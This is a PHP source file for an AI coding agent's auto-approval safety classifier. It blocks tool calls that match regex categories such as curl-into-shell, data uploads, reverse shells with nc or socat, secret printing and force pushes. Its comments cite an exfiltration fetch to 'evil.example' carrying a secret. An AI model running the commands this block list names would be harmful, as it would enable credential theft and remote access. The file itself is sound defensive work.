<?php

declare(strict_types=1);

namespace SugarCraft\Crush\Permissions;

use SugarCraft\Crush\ToolCall;

/**
 * SafetyClassifier reviews each tool call in Auto mode against a fixed
 * blocklist of dangerous-action categories (the crush_code_plan.md "Auto"
 * paragraph's thirteen, grown since — {@see PATTERNS} plus the two path
 * categories below). Returns the category name if blocked, null if the action
 * is safe to auto-execute.
 *
 * THREE TOOLS ARE CLASSIFIED, each by the argument that carries its risk
 * (audit F-P3(b); before it only `Bash` was, so under `auto`
 * `Write .git/hooks/pre-commit`, `WebFetch https://evil.example/?k=SECRET` and
 * `mcp__db__drop_table` were all Allow):
 *
 * - `Bash` by its command, against {@see PATTERNS};
 * - `Edit`/`Write` by their target, through {@see WritePathScope}: a path
 *   under `.git`, `.sugar-crush` or `.mcp.json` is
 *   {@see CATEGORY_PROTECTED_PATH_WRITE}, and one that is not provably inside
 *   the project root — absolute with no root to compare, escaping, or simply
 *   absent — is {@see CATEGORY_OUTSIDE_ROOT_WRITE};
 * - `WebFetch` by what its URL carries, through {@see FetchTarget}: a query
 *   string or userinfo is data sent to a host the model chose, so it is
 *   `external-endpoint`, the same category a `curl -d` is. An unparseable URL
 *   is too — fail closed; the tool would refuse it anyway, so the cost is one
 *   strike, never a lost fetch. HONEST LIMIT: data can ride in a URL's PATH
 *   or its hostname labels as well (`https://evil.example/<base64>`), and no
 *   classifier can tell an exfiltrating path from an ordinary one; a
 *   path-only fetch stays Allow here. `dont-ask`/`default` withholding
 *   `WebFetch` entirely (audit F-P6) is the boundary; this is a guard rail.
 *
 * `mcp__*` calls are NOT classified here, and that is not a gap: their
 * capability is server-defined and unknowable, so
 * {@see PermissionGate::evaluateAuto()} asks before every one instead of
 * pretending a category applies.
 *
 * Every pattern runs case-insensitively (see {@see self::regex()}), so a row
 * whose meaning hangs on a flag's case — curl's `-d` vs `-D`, ssh's `-L` vs
 * `-l` — scopes that part with `(?-i:...)`. A pattern must escape every
 * metacharacter it means literally: an unescaped `|` turned three
 * live-credentials rows into "any command containing `env `" (audit F-P3a).
 *
 * Mirrors charmbracelet/crush safety-classifier behavior (P2B.S3).
 */
final class SafetyClassifier
{
    /**
     * Command position: the start of the command line or of a chained /
     * piped / subshell command, optionally under `sudo`. Rows for a bare
     * command name (`fetch`, `httpx`, `expect`) are anchored here so that
     * `git fetch https://…`, `pip install httpx` and `git commit -m "expect
     * it"` stop reading as invocations of those programs.
     */
    private const CMD = '(?:^|[;&|(`\n])\s*(?:sudo\s+)?';

    /**
     * The remaining words of the SAME simple command, ending in whitespace,
     * or nothing. Quoted strings are consumed whole, so a flag spelled inside
     * a header value (`-H 'X: -d'`) is not a flag, while a `;` inside a quoted
     * header does not end the command; an unquoted `|`, `;`, `&` or newline
     * does. Without this bound a flag row read the next command's flags:
     * `curl -s x | grep -F y` would have been an upload.
     */
    private const ARGS = '(?:(?:\'[^\']*\'|"(?:[^"\\\\]|\\\\.)*"|[^\'"|;&\n])*\s)?';

    /**
     * Known dangerous patterns keyed by category name.
     *
     * @var array<string, string[]>
     */
    private const PATTERNS = [
        'curl/wget-into-shell' => [
            // `\b` so `| shasum` / `| shellcheck` are not `| sh`; an optional
            // `sudo` / absolute path so `| sudo bash` and `| /bin/sh` are.
            'curl\s+.*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:\S*/)?(?:sh|bash|zsh|fish)\b',
            'wget\s+.*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:\S*/)?(?:sh|bash|zsh|fish)\b',
            // A redirect onto a device (`/dev/tcp/…`, a disk) — not the
            // `> /dev/null` / `2>/dev/null` every quiet health check uses.
            'curl\s+.*>\s*/dev/(?!null\b|stdout\b|stderr\b|fd/)',
            'curl\s+.*\|.*(?:\b(?:eval|exec)\b|bash\s+-c)',
            'wget\s+.*\|.*(?:\b(?:eval|exec)\b|bash\s+-c)',
        ],
        'external-endpoint' => [
            // A mutating method anywhere in the command, not only as its first
            // flag (`curl -s -X POST …`, `curl --request PUT …`).
            'curl\s+' . self::ARGS . '(?:(?-i:-[A-Za-z]*X)\s*|--request[\s=]+)(?:POST|PUT|PATCH|DELETE)\b',
            // A request body or upload sends local data out:
            // `-d @~/.ssh/id_rsa`, `-d@file`, `-sd x`, `-F f=@x`, `-T x`.
            // Case-sensitive: `-D -` dumps headers and `-f` fails quietly.
            'curl\s+' . self::ARGS . '(?-i:-[A-Za-z]*[dFT])',
            'curl\s+' . self::ARGS . '--(?:data(?:-binary|-raw|-urlencode|-ascii)?|json|form(?:-string)?|upload-file)\b',
            'wget\s+' . self::ARGS . '--(?:method|post-data|post-file|body-data|body-file)\b',
            self::CMD . 'httpie\s+',
            self::CMD . 'httpx\s+',
            self::CMD . 'fetch\s+https?://',
            'Invoke-WebRequest\s+-Uri\s+https?://',
            'Start-BitsTransfer\s+.*https?://',
        ],
        'production-deploy' => [
            'fly\s+deploy',
            'fly\s+launch',
            'surfly\s+',
            'cap\s+production\s+deploy',
            'cap\s+deploy',
            'mina\s+deploy',
            'rocketeer\s+deploy',
            'deploy\s+--production',
            'deploy\s+to\s+production',
            'npm\s+run\s+deploy.*production',
            'yarn\s+deploy.*production',
            'kubectl\s+apply.*production',
            'kubectl\s+set\s+image.*production',
            'kustomize\s+edit\s+set\s+image.*production',
            'argocd\s+app\s+sync.*production',
            'argocd\s+app\s+create.*production',
            'terraform\s+apply\s+.*production',
            'terraform\s+apply\s+-var\s+env=production',
            'cdk\s+deploy\s+.*production',
        ],
        'production-migration' => [
            'php\s+artisan\s+migrate\s+--force',
            'php\s+artisan\s+migrate:fresh\s+--seed',
            'alembic\s+upgrade\s+head',
            'alembic\s+migrate\s+-x\s+production',
            'prisma\s+migrate\s+deploy',
            'prisma\s+migrate\s+reset',
            'knex\s+migrate:latest',
            'knex\s+migrate:rollback\s+--force',
            'sequelize-cli\s+migrate:run',
            'flyway\s+migrate',
            'liquibase\s+update',
            'liquibase\s+updateSQL',
        ],
        'mass-deletion-cloud-storage' => [
            'aws\s+s3\s+rm\s+--recursive',
            'aws\s+s3\s+rm\s+--force',
            'aws\s+s3\s+rm\s+s3://.*\s+--recursive',
            'aws\s+s3\s+rm\s+s3://.*\s+--force',
            'gcloud\s+storage\s+rm\s+.*--read-paths-from-file',
            'gcloud\s+storage\s+rm\s+.*--requester-pays',
            'gsutil\s+rm\s+-r\s+',
            'gsutil\s+rm\s+-f\s+',
            'az\s+storage\s+blob\s+delete-batch',
            'az\s+storage\s+file\s+delete-batch',
            'rclone\s+delete\s+',
            'rclone\s+purge\s+',
            's3cmd\s+del\s+--recursive',
            'mc\s+rm\s+--recursive',
            'mc\s+rb\s+--force',
            'aws\s+s3\s+sync\s+.*--delete',
        ],
        'granting-iam-permissions' => [
            'aws\s+iam\s+put-user-policy',
            'aws\s+iam\s+put-group-policy',
            'aws\s+iam\s+put-role-policy',
            'aws\s+iam\s+put-identity-policy',
            'aws\s+iam\s+create-policy',
            'aws\s+iam\s+attach-user-policy',
            'aws\s+iam\s+attach-group-policy',
            'aws\s+iam\s+attach-role-policy',
            'aws\s+iam\s+add-user-to-group',
            'aws\s+iam\s+create-user',
            'aws\s+iam\s+create-group',
            'aws\s+iam\s+create-role',
            'aws\s+iam\s+update-assume-role-policy',
            'gcloud\s+projects\s+add-iam-policy-binding',
            'gcloud\s+projects\s+set-iam-policy',
            'gcloud\s+iam\s+service-accounts\s+add-iam-policy-binding',
            'az\s+role\s+assignment\s+create',
            'az\s+ad\s+app\s+permission\s+grant',
            'terraform\s+import',
        ],
        'granting-repo-permissions' => [
            'gh\s+repo\s+create.*--visibility\s+(public|private)',
            'gh\s+repo\s+add-collaborator',
            'gh\s+org\s+transfer-owner',
            'gh\s+repo\s+transfer',
            'hub\s+clone\s+',
            'hub\s+pull-request\s+',
            'hub\s+api\s+.*--replace',
            'gh\s+api\s+.*--method\s+POST\s+.*repositories',
            'git\s+push\s+--set-upstream\s+origin\s+main',
            'git\s+push\s+--set-upstream\s+origin\s+master',
            'git\s+push\s+--force-with-lease\s+origin\s+main',
        ],
        'pre-session-deletion' => [
            // Deleting files known to pre-date the session is dangerous
            // These are heuristics; actual pre-session detection requires fs metadata
            // `.` escaped and the name bounded: the unescaped `./.git` matched
            // `./.github` and `a/.git`; `./vendor` matched `a/vendor-bin`.
            '\brm\s+-?(?:rf|fr)\s+' . self::ARGS . '(?:\./)?vendor(?:/\*?)?(?=$|[\s;&|)])',
            '\brm\s+-?(?:rf|fr)\s+' . self::ARGS . '(?:\./)?node_modules(?:/\*?)?(?=$|[\s;&|)])',
            '\brm\s+-?(?:rf|fr)\s+' . self::ARGS . '(?:\./)?\.git(?:/\*?)?(?=$|[\s;&|)])',
        ],
        'force-push-reset-hard' => [
            // Anywhere among push's own arguments (`git push origin main -f`),
            // which also covers --force-with-lease / --force-if-includes.
            'git\s+push\s+' . self::ARGS . '(?:--force\b|-[a-z]*f)',
            // A `+` refspec forces that one ref: `git push origin +main`,
            // `git push origin +HEAD:main`.
            'git\s+push\s+' . self::ARGS . '\+\S',
            'git\s+reset\s+--hard',
            'git\s+reset\s+--mixed',
            'git\s+reset\s+--soft\s+HEAD~',
            'git\s+reset\s+--hard\s+HEAD~',
            'git\s+reflog\s+expire\s+--expire=now\s+--all',
            'git\s+rebase\s+--interactive\s+--root\s+--exec',
            'git\s+filter-branch\s+',
            'git\s+blame\s+--date-format\s+shortest\s+--alt-compat\s+',
        ],
        'terraform-destroy' => [
            'terraform\s+destroy',
            'terraform\s+destroy\s+--auto-approve',
            'terraform\s+destroy\s+-auto-approve',
            'terraform\s+destroy\s+-force',
            'terraform\s+apply\s+.*-destroy',
            'terraform\s+apply\s+.*-destroy\s+--auto-approve',
            'pulumi\s+destroy',
            'pulumi\s+destroy\s+--yes',
            'pulumi\s+destroy\s+--skip-preview',
            'terraform\s+state\s+mv',
            'terraform\s+state\s+rm',
            'terraform\s+state\s+pull',
        ],
        'cross-repo-pr' => [
            'gh\s+pr\s+create\s+--repo',
            'hub\s+pull-request\s+--repo',
            'gh\s+pr\s+create\s+--head\s+[\w-]+:[\w-]+',
            'gh\s+api\s+repos/.*/pulls\s+--method\s+POST',
            'git\s+push\s+origin\s+.*:refs/heads/[\w-]+/[\w-]+',
        ],
        'automation-comments' => [
            // gh's real syntax is `gh pr comment 12 --body …`; the old
            // `comment create` / `review submit` rows matched no gh command.
            'gh\s+issue\s+comment\s+',
            'gh\s+pr\s+comment\s+',
            'gh\s+pr\s+review\s+',
            'gh\s+api\s+repos/.*/issues/.*/comments',
            'hub\s+issue\s+comment',
            'hub\s+pr\s+comment',
            'gitlab\s+note\s+create',
            'gitlab\s+mr\s+note\s+create',
        ],
        'interactive-shell-portforward' => [
            // Case-sensitive (the `i` flag made `ssh -l root host` a
            // forward), value attached or not (`-L8080:…`), after any
            // cluster of ssh's boolean flags (`-NfL`).
            'ssh\s+' . self::ARGS . '(?-i:-[46AaCfGgKkMNnqsTtVvXxYy]*[LRDW])',
            'kubectl\s+port-forward',
            'kubectl\s+exec\s+-i\s+-t',
            'kubectl\s+exec\s+--stdin\s+--tty',
            'docker\s+exec\s+-it',
            'docker\s+run\s+.*-it\s+',
            'python[\d.]*\s+.*-c\s+.*import\s+pty',
            self::CMD . 'script\s+.*-q\s+.*/dev/null',
            self::CMD . 'expect\s+',
            'socat\s+',
            '\bncat\s+--exec',
            // `\b`: unbounded, `nc\s+-e` matched inside `rsync -e ssh …`.
            '\bnc\s+-e\s+',
            '\bnetcat\s+.*-e\s+',
        ],
        'live-credentials' => [
            'echo\s+.*AWS_ACCESS_KEY',
            'echo\s+.*AWS_SECRET_KEY',
            'echo\s+.*AWS_SECRET_ACCESS_KEY',
            'echo\s+.*AWS_SESSION_TOKEN',
            'printenv\s+AWS_SECRET_ACCESS_KEY',
            'printenv\s+GOOGLE_APPLICATION_CREDENTIALS',
            'printenv\s+AZURE_CLIENT_SECRET',
            'printenv\s+STRIPE_SECRET_KEY',
            'printenv\s+SQUARE_ACCESS_TOKEN',
            'printenv\s+PRIVATE_KEY',
            'printenv\s+SSH_PRIVATE_KEY',
            'cat\s+.*\.env\s+.*AWS',
            'cat\s+.*\.env\s+.*SECRET',
            'cat\s+.*credentials\s+.*aws',
            'grep\s+.*AWS_ACCESS_KEY_ID\s+.*',
            'grep\s+.*password\s+.*\s+\|.+\s+echo',
            // The `|` is escaped: unescaped, each row was the alternation
            // "`env ` anywhere OR `grep KEY` anywhere" (`python3 -m venv
            // env`, `poetry env info`, `grep KEY README.md` were all
            // blocked). Spacing around the pipe, grep's flags and a name
            // prefix (`API_KEY`) are all optional.
            '\b(?:env|printenv)(?:\s+-\S+)*\s*\|\s*grep\s+(?:-\S+\s+)*["\x27]?[\w*.^]*SECRET',
            '\b(?:env|printenv)(?:\s+-\S+)*\s*\|\s*grep\s+(?:-\S+\s+)*["\x27]?[\w*.^]*PASSWORD',
            '\b(?:env|printenv)(?:\s+-\S+)*\s*\|\s*grep\s+(?:-\S+\s+)*["\x27]?[\w*.^]*KEY',
            'strings\s+.*\.env',
            'python[\d.]*\s+.*-c\s+.*os\.environ\[',
        ],
        'package-registry-sideload' => [
            'npm\s+install\s+.*--registry\s+https://registry\.npmjs\.org',
            'npm\s+install\s+.*--registry\s+https://registry\.nodejitsu\.org',
            'npm\s+install\s+.*--ignore-scripts',
            'pip\s+install\s+.*--index-url\s+https://pypi\.org/simple',
            'pip\s+install\s+.*--extra-index-url\s+https://pypi\.org/simple',
            'pip3\s+install\s+.*--index-url\s+https://pypi\.org/simple',
            'pip3\s+install\s+.*--extra-index-url\s+https://pypi\.org/simple',
            'yarn\s+add\s+.*--registry\s+https://registry\.yarnpkg\.com',
            'yarn\s+add\s+.*--ignore-scripts',
            'pnpm\s+add\s+.*--registry\s+https://registry\.npmjs\.org',
            'composer\s+require\s+.*--repository\s+https://packagist\.org',
            'gem\s+install\s+.*--no-document',
            '\bgo\s+get\s+.*https://github\.com/',
            '\bgo\s+install\s+.*@latest',
            'curl\s+.*pypi\.org.*pip\s+install',
            'wget\s+.*pypi\.org.*pip\s+install',
        ],
    ];

    /**
     * An `Edit`/`Write` aimed at `.git`, `.sugar-crush` or `.mcp.json` — the
     * repository's machinery and the session's own policy files.
     */
    public const CATEGORY_PROTECTED_PATH_WRITE = 'protected-path-write';

    /**
     * An `Edit`/`Write` whose target is not provably inside the project root.
     */
    public const CATEGORY_OUTSIDE_ROOT_WRITE = 'outside-root-write';

    /**
     * Classify a tool call — returns the dangerous-action category name if blocked,
     * null if the action is safe to auto-execute.
     *
     * @param string|null $projectRoot the root the write tools resolve a
     *        relative path against; see {@see WritePathScope::of()} for what
     *        changes without one (only a relative, lexically contained target
     *        is inside). Only `Edit`/`Write` read it.
     */
    public function classify(ToolCall $call, ?string $projectRoot = null): ?string
    {
        return match ($call->name) {
            'Bash' => $this->classifyBash($call),
            'Edit', 'Write' => $this->classifyWrite($call, $projectRoot),
            'WebFetch' => $this->classifyFetch($call),
            default => null,
        };
    }

    private function classifyWrite(ToolCall $call, ?string $projectRoot): ?string
    {
        return match (WritePathScope::of($call->arguments['file_path'] ?? null, $projectRoot)) {
            WritePathScope::INSIDE => null,
            WritePathScope::PROTECTED => self::CATEGORY_PROTECTED_PATH_WRITE,
            default => self::CATEGORY_OUTSIDE_ROOT_WRITE,
        };
    }

    private function classifyFetch(ToolCall $call): ?string
    {
        $target = FetchTarget::fromUrl($call->arguments['url'] ?? null);

        if ($target === null || $target->carriesQuery || $target->carriesUserInfo) {
            return 'external-endpoint';
        }

        return null;
    }

    private function classifyBash(ToolCall $call): ?string
    {
        $args = $call->arguments;

        if (!isset($args['command']) || !is_string($args['command'])) {
            return null;
        }

        $cmd = $args['command'];

        foreach (self::PATTERNS as $category => $patterns) {
            foreach ($patterns as $pattern) {
                if ($this->matches($pattern, $cmd)) {
                    return $category;
                }
            }
        }

        return null;
    }

    private function matches(string $pattern, string $subject): bool
    {
        $result = @preg_match(self::regex($pattern), $subject);

        // A PCRE failure (backtrack/JIT limit on a crafted command) is not a
        // verdict of "safe": fail closed, so an oversized command cannot slip
        // past a row by exhausting it.
        return $result !== 0;
    }

    /**
     * The delimited form of a PATTERNS row. `#` is the delimiter, so a row
     * must not contain an unescaped `#` (the table's compile test pins it).
     */
    private static function regex(string $pattern): string
    {
        return '#' . $pattern . '#i';
    }
}
